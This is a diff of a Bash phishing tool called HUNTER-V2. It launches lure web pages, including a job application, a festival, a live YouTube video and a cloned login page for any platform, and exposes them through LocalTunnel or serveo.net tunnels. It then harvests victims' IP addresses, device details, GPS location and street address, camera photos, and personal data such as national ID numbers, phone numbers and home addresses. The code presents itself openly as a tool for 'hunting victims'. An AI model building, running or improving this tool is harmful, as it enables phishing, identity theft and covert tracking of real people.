@@ -1,20 +1,15 @@
-#!/bin/bash
-
-# Fixed version for Kali Linux
-# Line endings converted to Unix format (LF)
-
 __NAME__="HUNTER-V2"
 __VERSION__="2.0"
 __AUTHOR__="ATHEX"
 
 ### Script termination
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' INT
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' TERM
-trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' TSTP
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' 1
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' 2
+trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP
+
 
 function Desktop()
 {
-    clear
     printf "\033[1;33m                             CREATED  BY ~ \033[1;37mA T H E X\033[1;33m ~\n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "    ######## # ###### ###### # # ###### ######## ######## ######## ########     \n"
@@ -30,11 +25,13 @@ function Desktop()
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "    ######## ######## ######## ######## ######## ######## ######## ########     \n"
     printf "\033[0m\n"
-}
+ 
+
+}                           
 
 function Android()
 {
-    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"
+    printf "\033[1;33m  CREATED BY \033[1;37mATHEX\033[1;33m\n"          #  
     printf "         /\  ____  __/|  ________\033[1;37mv\033[4;1m[$__VERSION__]\033[0m\033[1;33m__ \n"
     printf "        / / / / / / / | / /_  __/ ____/ __ \ \n"
     printf "       / /_/ / / / /  |/ / / / / __/ / /_/ / \n"
@@ -58,16 +55,17 @@ function banner(){
     fi
 }
 
+
 function loading()
 {
-    dot=(. . .)
-    for i in "${dot[@]}"
-    do
-        printf "%s" "$i"
-        sleep 1
-    done
-    echo -e "\033[1;77m"
-    sleep 1
+	dot=(. . .)
+	for i in "${dot[@]}"
+	do
+		printf $i
+		sleep $((1))
+	done
+	echo -e "\033[1;77m"
+	sleep $((1))
 }
 
 function kill_Processors() 
@@ -77,15 +75,15 @@ function kill_Processors()
     checkssh=$(ps aux | grep -o "ssh" | head -n1)
 
     if [[ $checklt == *'lt'* ]]; then
-        pkill -f lt > /dev/null 2>&1
+        killall -2 lt > /dev/null 2>&1
     fi
     
     if [[ $checkphp == *'php'* ]]; then
-        pkill -f php > /dev/null 2>&1
+        killall -2 php > /dev/null 2>&1
     fi
 
     if [[ $checkssh == *'ssh'* ]]; then
-        pkill -f "ssh.*serveo\|ssh.*localhost" > /dev/null 2>&1
+        killall -2 ssh > /dev/null 2>&1
     fi
 }
 
@@ -93,33 +91,33 @@ function install_LT()
 {
     read -p $'\n\033[1;33m[\033[1;37m++\033[1;33m] Press [\033[1;37mEnter\033[1;33m] to start the installation process, otherwise type (n/No): \033[1;37m' act
     if [[ $act == "n" || $act == "no" || $act == "N" || $act == "No" || $act == "NO" ]]; then
-        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Note that the LocalTunnel can'\''t be use because you denied the installation.\n"
+        printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Note that the LocalTunnel can't be use because you denied the installation.\n"
         redirection
     fi
 
     command -v npm > /dev/null 2>&1 || {
         printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Installing node.js on this machine";loading;
-        sudo apt update && sudo apt install -y nodejs npm > /dev/null 2>&1 || { 
+        apt install npm > /dev/null 2>&1 || { 
             sleep 2;
-            printf "\033[1;33m[\033[1;37m++\033[1;33m] Node.js not install!, if you'\''re not on root.\033[1;37m\n";
+            printf "\033[1;33m[\033[1;37m++\033[1;33m] Node.js not install!, if you're not on root.\033[1;37m\n";
             printf "\033[1;33m[\033[1;37m++\033[1;33m] Run this script on root and try again, else check your internet connection.\033[1;37m\n"; 
             exit 1; 
         }
     }
     
-    sleep 2
+    sleep 5
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Installing LocalTunnel using node.js";loading
-    sudo npm install -g localtunnel > /dev/null 2>&1 || { 
+    npm install -g localtunnel > /dev/null 2>&1 || { 
         sleep 2;
         printf "\033[1;33m[\033[1;37m++\033[1;33m] LocalTunnel not install!,\033[1;37m\n"; 
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please check your internet connection\033[1;37m\n"; 
         exit 1;
     }
-    sleep 2
+    sleep 5
     
-    command -v lt > /dev/null 2>&1 || { 
+    lt > /dev/null 2>&1 || { 
         sleep 2;
-        printf "\033[1;33m[\033[1;37m++\033[1;33m] Hmm, we can'\''t automatically install LocalTunnel,\033[1;37m\n";  
+        printf "\033[1;33m[\033[1;37m++\033[1;33m] Hmm, we can't automatically install LocalTunnel,\033[1;37m\n";  
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Please visit\033[1;37m https://localtunnel.me/ \033[1;33mto learn how to manually install it.\033[1;37m\n"; 
         exit 1;
      }
@@ -138,7 +136,7 @@ function suspend_script()
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
     Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
-    xdg-open "$Athexhacker" 2>/dev/null || echo "URL: $Athexhacker"
+    xdg-open $Athexhacker
     echo ""
 }
 
@@ -150,7 +148,7 @@ function redirection()
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Also follow us on github, star and fork this our hacking tools\033[1;37m\n"
     printf "\033[1;33m[\033[1;37m++\033[1;33m] Thank for using \033[1;37mHUNTER\033[1;33m!, and again happy hunting victims info\033[1;37m";loading
     Athexhacker="https://github.com/Athexhacker/HUNTER-V2" 
-    xdg-open "$Athexhacker" 2>/dev/null || echo "URL: $Athexhacker"
+    xdg-open $Athexhacker
     echo ""
 }
 
@@ -159,26 +157,26 @@ function catch_victims()
     printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Waiting for victims, Press Ctrl+C to quit";loading
     sleep 1
 
-    while true; do
-        trap "break" INT
+    while [ true ]; do
+    	trap "break" INT
         if [[ -e "ip.txt" ]]; then
             t=$(grep -a 'time' ip.txt | cut -d "=" -f 2 | tr -d '\r')
             d=$(grep -a 'date' ip.txt | cut -d "=" -f 2 | tr -d '\r')
             ip=$(grep -a 'ip' ip.txt | cut -d "=" -f 2 | tr -d '\r')
             agent=$(grep -a 'agent' ip.txt | cut -d "=" -f 2 | tr -d '\r')
 
-            if [[ -d "$ip/$d" ]]; then
-                cat ip.txt >> "$ip/$d/victim_Info.txt"
+            if [[ -d $ip/$d ]]; then
+                cat ip.txt >> $ip/$d/victim_Info.txt
             else
-                mkdir -p "$ip/$d"
-                cat ip.txt >> "$ip/$d/victim_Info.txt"
+                mkdir -p $ip/$d
+                cat ip.txt >> $ip/$d/victim_Info.txt
             fi
             rm -rf ip.txt
 
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Victims successfully visit our malicious link!";loading
-            printf "   \033[1;33mTime: \033[1;37m%s\n" "$t" 
-            printf "   \033[1;33mDate: \033[1;37m%s\n" "$d"
-            printf "   \033[1;33mVictims IP: \033[1;37m%s\n" "$ip" 
+            printf "   \033[1;33mTime: \033[1;37m%s\n" $t 
+            printf "   \033[1;33mDate: \033[1;37m%s\n" $d
+            printf "   \033[1;33mVictims IP: \033[1;37m%s\n" $ip 
         fi
 
         sleep 0.5
@@ -209,79 +207,79 @@ function catch_victims()
             sWth=$(grep -a 'screenWidth' victims.txt | cut -d "=" -f 2 | tr -d '\r')
             sHgh=$(grep -a 'screenHeight' victims.txt | cut -d "=" -f 2 | tr -d '\r')
             
-            cat victims.txt >> "$ip/$d/victim_Info.txt"
+            cat victims.txt >> $ip/$d/victim_Info.txt
             rm -rf victims.txt
 
-            printf "   \n\033[1;33mVictims Name: \033[1;37m%s\n" "$victims"
+            printf "   \n\033[1;33mVictims Name: \033[1;37m%s\n" $victims
             
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Browser Information";loading
             if [[ $app == "Unidentified" ]]; then
-                printf "   \033[1;33mName: \033[1;31m%s\n" "$app"
-                printf "   \033[1;33mVersion: \033[1;31m%s\n" "$appV"
+                printf "   \033[1;33mName: \033[1;31m%s\n" $app
+                printf "   \033[1;33mVersion: \033[1;31m%s\n" $appV
             else
-                printf "   \033[1;33mName: \033[1;37m%s\n" "$app"
-                printf "   \033[1;33mVersion: \033[1;37m%s\n" "$appV"
+                printf "   \033[1;33mName: \033[1;37m%s\n" $app
+                printf "   \033[1;33mVersion: \033[1;37m%s\n" $appV
             fi
 
-            printf "   \033[1;33mLanguages: \033[1;37m%s\n" "$lgg"
-            printf "   \033[1;33mApp Name: \033[1;37m%s\n" "$appN"
-            printf "   \033[1;33mApp Code Name: \033[1;37m%s\n" "$appC"
-            printf "   \033[1;33mCookie Enabled: \033[1;37m%s\n" "$coo"
+            printf "   \033[1;33mLanguages: \033[1;37m%s\n" $lgg
+            printf "   \033[1;33mApp Name: \033[1;37m%s\n" $appN
+            printf "   \033[1;33mApp Code Name: \033[1;37m%s\n" $appC
+            printf "   \033[1;33mCookie Enabled: \033[1;37m%s\n" $coo
             printf "   \033[1;33mJavaScript Enabled: \033[1;37mtrue\n"
 
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Device Information";loading
-            printf "   \033[1;33mOS: \033[1;37m%s\n" "$os"
+            printf "   \033[1;33mOS: \033[1;37m%s\n" $os
             
             if [[ $device == "Unidentified" ]]; then
-                printf "   \033[1;33mDevice: \033[1;31m%s\n" "$device"
+            	printf "   \033[1;33mDevice: \033[1;31m%s\n" $device
             else
-                printf "   \033[1;33mDevice: \033[1;37m%s\n" "$device"
+            	printf "   \033[1;33mDevice: \033[1;37m%s\n" $device
             fi
 
             if [[ $plat == "Unidentified" ]]; then
-                printf "   \033[1;33mPlatform: \033[1;31m%s\n" "$plat"
+            	printf "   \033[1;33mPlatform: \033[1;31m%s\n" $plat
             else
-                printf "   \033[1;33mPlatform: \033[1;37m%s\n" "$plat"
+            	printf "   \033[1;33mPlatform: \033[1;37m%s\n" $plat
             fi
 
             if [[ $arch == "Unidentified" || -z $arch ]]; then
-                printf "   \033[1;33marchitecture: \033[1;31m%s\n" "$arch"
+            	printf "   \033[1;33marchitecture: \033[1;31m%s\n" $arch
             else
-                printf "   \033[1;33marchitecture: \033[1;37m%s\n" "$arch"
+            	printf "   \033[1;33marchitecture: \033[1;37m%s\n" $arch
             fi
 
             if [[ -z $dMl || $dMl == "Unidentified" ]]; then
                 printf "   \033[1;33mDevice Model: \033[1;31mUnidentified\n" 
             else
-                printf "   \033[1;33mDevice Model: \033[1;37m%s\n" "$dMl"
+            	printf "   \033[1;33mDevice Model: \033[1;37m%s\n" $dMl
             fi
 
             if [[ $dVs == "Unidentified" ]]; then
-                printf "   \033[1;33mDevice Version: \033[1;31m%s\n" "$dVs"
+            	printf "   \033[1;33mDevice Version: \033[1;31m%s\n" $dVs
             else
-                printf "   \033[1;33mDevice Version: \033[1;37m%s\n" "$dVs"
+            	printf "   \033[1;33mDevice Version: \033[1;37m%s\n" $dVs
             fi
 
-            printf "   \033[1;33mNumber of CPU Cores: \033[1;37m%s\n" "$cpu"
+            printf "   \033[1;33mNumber of CPU Cores: \033[1;37m%s\n" $cpu
             printf "   \e[1;95mScreen Resolution\n"
-            printf "   \033[1;33mDevice Width: \033[1;37m%s\n" "$sWth"
-            printf "   \033[1;33mDevice Height: \033[1;37m%s\n" "$sHgh"
-            printf "   \033[1;33mDevice Summary: \033[1;37m%s\n" "$smy"
-            printf "   \033[1;33mDevice Date & Time: \033[1;37m%s\n" "$date"
+            printf "   \033[1;33mDevice Width: \033[1;37m%s\n" $sWth
+            printf "   \033[1;33mDevice Height: \033[1;37m%s\n" $sHgh
+            printf "   \033[1;33mDevice Summary: \033[1;37m%s\n" $smy
+            printf "   \033[1;33mDevice Date & Time: \033[1;37m%s\n" $date
 
             
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Victims Location";loading
-            printf "   \033[1;33mCity: \033[1;37m%s\n" "$ct"
-            printf "   \033[1;33mRegion: \033[1;37m%s\n" "$rgn"
-            printf "   \033[1;33mCountry: \033[1;37m%s\n" "$cty"
-            printf "   \033[1;33mTimezone: \033[1;37m%s\n" "$tz"
+            printf "   \033[1;33mCity: \033[1;37m%s\n" $ct
+            printf "   \033[1;33mRegion: \033[1;37m%s\n" $rgn
+            printf "   \033[1;33mCountry: \033[1;37m%s\n" $cty
+            printf "   \033[1;33mTimezone: \033[1;37m%s\n" $tz
 
-            if [[ ! $lat == "Unidentified" && ! $lng == "Unidentified" ]]; then
-                printf "   \033[1;33mLatitude: \033[1;37m%s\n" "$lat"
-                printf "   \033[1;33mLongitude: \033[1;37m%s\n" "$lng"
+            if [[ !$lat == "Unidentified" && !$lng == "Unidentified" ]]; then
+                printf "   \033[1;33mLatitude: \033[1;37m%s\n" $lat
+                printf "   \033[1;33mLongitude: \033[1;37m%s\n" $lng
 
-                if [[ ! $addr == "Unidentified" ]]; then
-                    printf "   \033[1;33mExact Address: \033[1;37m%s\n" "$addr"
+                if [[ !$addr == "Unidentified" ]]; then
+                    printf "   \033[1;33mExact Address: \033[1;37m%s\n" $addr
                     printf '\n\033[1;33m[\033[1;37m++\033[1;33m] Victims GPS location found.\e[0m '
                     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Will you like to track the exact location on google map? [Y/n]:\e[0m ' Do__
                     if [[ $Do__ == "Y" || $Do__ == "y" || $Do__ == "Yes" || $Do__ == "yes" || $Do__ == "YES" ]]; then
@@ -289,9 +287,9 @@ function catch_victims()
                         url="https://google.com/maps/place/$lat,$lng/@$lat,$lng,16z"
                         printf "\n\033[1;37m[\033[1;33m++\033[1;37m] Mapping victims exact Location";loading
                         message="use this link to map victims location: $url" 
-                        echo "$message" >> "$ip/$d/victim_Info.txt"
+                        echo $message >> $ip/$d/victim_Info.txt
                         sleep 1
-                        xdg-open "$url" 2>/dev/null || echo "Open this URL manually: $url"
+                        xdg-open $url
                     elif [[ $Do__ == "n" || $Do__ == "No" || $Do__ == "no" || $Do__ == "N" || $Do__ == "NO" ]]; then
                         printf "\n\033[1;37m[\033[1;33m++\033[1;37m] We hope you know what you are doing!";loading
                     else
@@ -299,12 +297,12 @@ function catch_victims()
                     fi
 
                 else
-                    printf "   \033[1;33mExact Address: \033[1;31m%s\n" "$addr"
+                    printf "   \033[1;33mExact Address: \033[1;31m%s\n" $addr
                 fi
             else
-                printf "   \033[1;33mLatitude: \033[1;31m%s\n" "$lat"
-                printf "   \033[1;33mLongitude: \033[1;31m%s\n" "$lng"
-                printf "   \033[1;33mExact Address: \033[1;31m%s\n" "$addr"
+                printf "   \033[1;33mLatitude: \033[1;31m%s\n" $lat
+                printf "   \033[1;33mLongitude: \033[1;31m%s\n" $lng
+                printf "   \033[1;33mExact Address: \033[1;31m%s\n" $addr
             fi
         fi
 
@@ -325,29 +323,29 @@ function catch_victims()
             galary=$(grep -a 'galaryPic' form.txt | cut -d "=" -f 2 | tr -d '\r')
             marry=$(grep -a 'maritan' form.txt | cut -d "=" -f 2 | tr -d '\r')
             
-            cat form.txt >> "$ip/$d/victim_Info.txt"
+            cat form.txt >> $ip/$d/victim_Info.txt
             rm -rf form.txt
 
             printf "\n\033[1;32m[\033[1;37m√√\033[1;32m] Personal information!";loading
-            printf "   \033[1;33mAge: \033[1;37m%s\n" "$age" 
-            printf "   \033[1;33mGender: \033[1;37m%s\n" "$gender" 
-            printf "   \033[1;33mMarritan: \033[1;37m%s\n" "$marry" 
-            printf "   \033[1;33mFull Name: \033[1;37m%s\n" "$victims" 
-            printf "   \033[1;33mProfession: \033[1;37m%s\n" "$prof" 
-            printf "   \033[1;33mPhone Number: \033[1;37m%s\n" "$phone"
-            printf "   \033[1;33mEmail Address: \033[1;37m%s\n" "$email" 
-            printf "   \033[1;33mDate-of-Birth: \033[1;37m%s\n" "$dob" 
-            printf "   \033[1;33mState (city): \033[1;37m%s\n" "$state" 
-            printf "   \033[1;33mNationality: \033[1;37m%s\n" "$cty" 
-            printf "   \033[1;33mLocal Government Area: \033[1;37m%s\n" "$lga" 
-            printf "   \033[1;33mHome Address: \033[1;37m%s\n" "$homeaddr" 
-            printf "   \033[1;33mNational ID Number: \033[1;37m%s\n" "$nin" 
-            printf "   \033[1;33mLast/Current Occupation: \033[1;37m%s\n" "$occ" 
+            printf "   \033[1;33mAge: \033[1;37m%s\n" $age 
+            printf "   \033[1;33mGender: \033[1;37m%s\n" $gender 
+            printf "   \033[1;33mMarritan: \033[1;37m%s\n" $marry 
+            printf "   \033[1;33mFull Name: \033[1;37m%s\n" $victims 
+            printf "   \033[1;33mProfession: \033[1;37m%s\n" $prof 
+            printf "   \033[1;33mPhone Number: \033[1;37m%s\n" $phone
+            printf "   \033[1;33mEmail Address: \033[1;37m%s\n" $email 
+            printf "   \033[1;33mDate-of-Birth: \033[1;37m%s\n" $dob 
+            printf "   \033[1;33mState (city): \033[1;37m%s\n" $state 
+            printf "   \033[1;33mNationality: \033[1;37m%s\n" $cty 
+            printf "   \033[1;33mLocal Government Area: \033[1;37m%s\n" $lga 
+            printf "   \033[1;33mHome Address: \033[1;37m%s\n" $homeaddr 
+            printf "   \033[1;33mNational ID Number: \033[1;37m%s\n" $nin 
+            printf "   \033[1;33mLast/Current Occupation: \033[1;37m%s\n" $occ 
             
             if [[ $galary == "Unable_to_upload_victims_photo_to_the_server" ]]; then
-                printf "   \n\033[1;33mVictims Galary Pic: \033[1;31m%s\n" "$galary" 
+            	printf "   \n\033[1;33mVictims Galary Pic: \033[1;31m%s\n" $galary 
             else
-                printf "   \n\033[1;33mVictims Galary Pic: \033[1;37m%s\n" "$galary"
+            	printf "   \n\033[1;33mVictims Galary Pic: \033[1;37m%s\n" $galary
             fi
         fi
 
@@ -359,7 +357,7 @@ function catch_victims()
             denied2=$(grep -a 'denied2' attention.txt | cut -d "=" -f 2 | tr -d '\r')
             granted1=$(grep -a 'granted1' attention.txt | cut -d "=" -f 2 | tr -d '\r')
             granted2=$(grep -a 'granted2' attention.txt | cut -d "=" -f 2 | tr -d '\r')
-            cat attention.txt >> "$ip/$d/victim_Info.txt"
+	        cat attention.txt >> $ip/$d/victim_Info.txt
             rm -rf attention.txt
             
             printf "\n\033[1;33m[\033[1;37m!!\033[1;33m] Attention!";loading
@@ -372,20 +370,20 @@ function catch_victims()
                 break
             fi
             if [[ -n $msg ]]; then
-                printf "\033[1;32mImportant Note: \033[1;97m%s\e[0m\n" "$msg"
+                printf "\033[1;32mImportant Note: \033[1;97m%s\e[0m\n" $msg
             fi
             if [[ -n $denied1 ]]; then
-                printf "\033[1;31mCamera Access Denied: \033[1;97m%s\e[0m\n" "$denied1"
+                printf "\033[1;31mCamera Access Denied: \033[1;97m%s\e[0m\n" $denied1
             fi
             if [[ -n $granted1 ]]; then
-                printf "\033[1;32mCamera Access Granted: \033[1;97m%s\e[0m\n" "$granted1"
+                printf "\033[1;32mCamera Access Granted: \033[1;97m%s\e[0m\n" $granted1
             fi
 
             if [[ -n $denied2 ]]; then
-                printf "\033[1;31mLocation Access Denied: \033[1;97m%s\e[0m\n" "$denied2"
+                printf "\033[1;31mLocation Access Denied: \033[1;97m%s\e[0m\n" $denied2
             fi
             if [[ -n $granted2 ]]; then
-                printf "\033[1;32mLocation Access Granted: \033[1;97m%s\e[0m\n" "$granted2"
+                printf "\033[1;32mLocation Access Granted: \033[1;97m%s\e[0m\n" $granted2
             fi
         fi
 
@@ -394,7 +392,7 @@ function catch_victims()
             file=$(grep -a 'file' image.txt | cut -d "=" -f 2 | tr -d '\r')
             rm -rf image.txt
             printf "\n\033[1;33m[\033[1;37m++\033[1;33m] Victims picture received!\033[0m";loading
-            printf "   \033[1;33mSaved at: \033[1;37m%s\n" "$file" 
+            printf "   \033[1;33mSaved at: \033[1;37m%s\n" $file 
         fi
         sleep 0.5
     done
@@ -402,14 +400,14 @@ function catch_victims()
     trap - INT
     kill_Processors
 
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' INT
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' TERM
-    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' TSTP
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Terminated!";loading;redirection;printf "\033[0m";exit 1' 1
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Interrupted!";loading;redirection;printf "\033[0m";exit 1' 2
+    trap 'printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Program Suspended!";suspend_script;printf "\033[0m";exit 1' SIGTSTP
 
     dir="$ip/$d/victim_Info.txt"
     if [[ -n $ip ]]; then
         if [[ -n $agent ]]; then
-            printf "   \033[1;33m\nVictims User Agent: \033[1;37m%s\n" "$agent"
+            printf "   \033[1;33m\nVictims User Agent: \033[1;37m%s\n" $agent
         else
             printf "\n\033[1;33m[\033[1;37m++\033[1;33m] User Agent can not be found in victims browser\033[1;37m\n"
         fi
@@ -431,7 +429,7 @@ function catch_victims()
     fi
 
     Athexhacker="https://github.com/Athexhacker/HUNTER-V2"
-    xdg-open "$Athexhacker" 2>/dev/null || echo "URL: $Athexhacker"
+    xdg-open $Athexhacker
     echo ""
     exit 0
 
@@ -446,7 +444,7 @@ function template()
     printf "   \033[1;33m[\033[1;37m03\033[1;33m] Live Youtube Video\n"
     printf "   \033[1;33m[\033[1;37m04\033[1;33m] Custom Social Platform\n\n"
     read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Choose a Template to Used [\033[1;37mDefault is 1\033[1;33m]:\033[1;37m ' temp
-    if [[ $temp -gt 4 && $temp -lt 1 ]]; then
+    if  [[ $temp -gt 4 && $temp -lt 1 ]]; then
         printf "\n\033[1;31m[\033[1;37m--\033[1;31m] Invalid Template Option!\n"
         printf '\033[1;31m[\033[1;37m!!\033[1;31m] Please Try Again.\033[0m\n'
         sleep 2
@@ -485,7 +483,7 @@ function template()
         temp=1
     elif [[ $temp == 4 ]] || [[ $temp == 04 ]]; then
         read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Enter Platform Name:\033[1;37m ' platformName
-        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste \"'$platformName'\" Login URL:\033[1;37m ' platformURL
+        read -p $'\033[1;33m[\033[1;37m++\033[1;33m] Copy and Paste "'$platformName'" Login URL:\033[1;37m ' platformURL
         platformName="${platformName//[[:space:]]/}"
         while [[  -z $platformName || -z $platformURL ]]
         do
@@ -507,44 +505,31 @@ function template()
 
 function templateSetup()
 {
+    # echo -e "$temp\n$mal_link\n$festName\n$subdomain"
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Preparing a template for the attack";loading
     sleep 2
 
-    if [[ -f "payload.js" ]]; then
-        sed 's+malicious_link+'$mal_link'+g' payload.js > payload1.js
-    fi
-    
+    # sed 's+malicious_link+'$mal_link'+g' template.php > index.php
+    sed 's+malicious_link+'$mal_link'+g' payload.js > payload1.js
     if [[ $temp -eq 2 ]]; then
-        if [[ -f "festival.html" ]]; then
-            sed 's+malicious_link+'$mal_link'+g' festival.html > index2.html
-        fi
-        if [[ -f "payload1.js" ]]; then
-            sed 's+fes_name+'$festName'+g' payload1.js > payload2.js
-            rm -rf payload1.js
-        fi
+        sed 's+malicious_link+'$mal_link'+g' festival.html > index2.html
+        sed 's+fes_name+'$festName'+g' payload1.js > payload2.js
+        rm -rf payload1.js
     elif [[ $temp -eq 3 ]]; then
-        if [[ -f "youtube.html" ]]; then
-            sed 's+malicious_link+'$mal_link'+g' youtube.html > index3.html
-            sed 's+live_yt_tv+'$videoID'+g' index3.html > index2.html
-        fi
+        sed 's+malicious_link+'$mal_link'+g' youtube.html > index3.html
+        sed 's+live_yt_tv+'$videoID'+g' index3.html > index2.html
     elif [[ $temp -eq 1 ]]; then
-        if [[ -f "applicant.html" ]]; then
-            sed 's+malicious_link+'$mal_link'+g' applicant.html > index2.html
-        fi
+        sed 's+malicious_link+'$mal_link'+g' applicant.html > index2.html
     else
-        if [[ -f "platform.html" ]]; then
-            sed 's+malicious_link+'$mal_link'+g' platform.html > index3.html
-            sed 's+plat_link+'$platformURL'+g' index3.html > index4.html
-            sed 's+plat_name+'$platformName'+g' index4.html > index2.html
-            rm -rf index4.html
-        fi
+        sed 's+malicious_link+'$mal_link'+g' platform.html > index3.html
+        sed 's+plat_link+'$platformURL'+g' index3.html > index4.html
+        sed 's+plat_name+'$platformName'+g' index4.html > index2.html
+        rm -rf index4.html
     fi
-    if [[ -f "index3.html" ]]; then
-        rm -rf index3.html
-    fi
+    rm -rf index3.html
 
     sleep 1
-    printf '\n\033[1;32m[\033[1;37m√√\033[1;32m] Malicious link:\033[1;37m %s\033[1;37m\n' "$mal_link"
+    printf '\n\033[1;32m[\033[1;37m√√\033[1;32m] Malicious link:\033[1;37m %s/\033[1;37m\n' $mal_link
     sleep 2
     catch_victims
 }
@@ -559,18 +544,18 @@ function localhost()
 
     addr="127.0.0.1:31301"
     printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php server";loading
+    # pid=$(pidof php)
+    # kill $pid > /dev/null 2>&1    //kill running process by PID
     
-    port=$(lsof -t -i:31301 -sTCP:LISTEN 2>/dev/null)
-    if [[ -n $port ]]; then
-        kill -9 "$port" > /dev/null 2>&1
-    fi
-    
-    php -S "$addr" > /dev/null 2>&1 &
+    port=$(lsof -t -i:31301 -sTCP:LISTEN)
+    kill -9 $port > /dev/null 2>&1 #kill running process by port listener
+    php -S $addr 1> /dev/null 2> maliciouslink &
     sleep 3
 
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Generating malicious link";loading
-    mal_link="http://$addr"
+    mal_link=$(grep -oE "http://[a-zA-Z0-9.-:]+" maliciouslink | head -n 1)
 
+    rm -rf maliciouslink
     sleep 2
     
     templateSetup
@@ -585,25 +570,24 @@ function localtunnel()
     }
 
     printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
+    # pid=$(pidof php)
+    # kill $pid > /dev/null 2>&1    //kill running process by PID
     
-    port=$(lsof -t -i:31301 -sTCP:LISTEN 2>/dev/null)
-    if [[ -n $port ]]; then
-        kill -9 "$port" > /dev/null 2>&1
-    fi
-    
+    port=$(lsof -t -i:31301 -sTCP:LISTEN)
+    kill -9 $port > /dev/null 2>&1 #kill running process by port listener
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting LocalTunnel";loading
 
-    command -v lt > /dev/null 2>&1 || { 
+    lt > /dev/null 2>&1 || { 
         printf "\033[1;33m[\033[1;37m++\033[1;33m] Opsy!, Localtunnel is not install.\n"; 
         printf "\033[1;33m[\033[1;37m++\033[1;33m] But we can try installing it automatically.\n"; 
         install_LT;
     }
 
-    lt --port 31301 --subdomain "$subdomain" 2> sshError > maliciouslink &
-    sleep 10
+    lt --port 31301 2> sshError > maliciouslink &
+    sleep 7
 
     if [[ -e sshError ]]; then
         conn=$(grep -a "Connection refused" sshError)
@@ -637,12 +621,12 @@ function localtunnel()
     sleep 3
 
     if [[ -s maliciouslink ]]; then
-        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.loca\.lt" maliciouslink | head -n 1)
+        mal_link=$(grep -o "https://[a-zA-Z0-9.-]*\.loca.lt" maliciouslink | head -n 1)    #
         rm -rf maliciouslink
         sleep 2
     else
-        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!\033[0m\n"
-        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some.\033[0m\n"
+        printf "\n\n\033[1;31m[\033[1;37m--\033[1;31m] Timeout: seems like you are running out of data!./033[0m\n"
+        printf "\033[1;31m[\033[1;37m--\033[1;31m] Please ensure you have enough data on your network, else go sub some./033[0m\n"
         rm -rf maliciouslink
         exit 1
     fi
@@ -665,18 +649,17 @@ function serveo()
     }
 
     printf "\n\n\033[1;37m[\033[1;33m++\033[1;37m] Starting php";loading
+    # pid=$(pidof php)
+    # kill $pid > /dev/null 2>&1    //kill running process by PID
     
-    port=$(lsof -t -i:31301 -sTCP:LISTEN 2>/dev/null)
-    if [[ -n $port ]]; then
-        kill -9 "$port" > /dev/null 2>&1
-    fi
-    
+    port=$(lsof -t -i:31301 -sTCP:LISTEN)
+    kill -9 $port > /dev/null 2>&1 #kill running process by port listener
     php -S localhost:31301 > /dev/null 2>&1 &
     sleep 3
 
     printf "\033[1;37m[\033[1;33m++\033[1;37m] Starting serveo.net";loading
-    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R "${subdomain}:80:localhost:31301" serveo.net 2> sshError > maliciouslink &
-    sleep 10
+    ssh -o StrictHostKeyChecking=no -R 80:localhost:31301 serveo.net 2> sshError > maliciouslink &
+    sleep 7
 
     if [[ -e sshError ]]; then
         conn=$(grep -a "Connection refused" sshError)
@@ -710,12 +693,12 @@ function serveo()
     sleep 3
 
     if [[ -s maliciouslink ]]; then
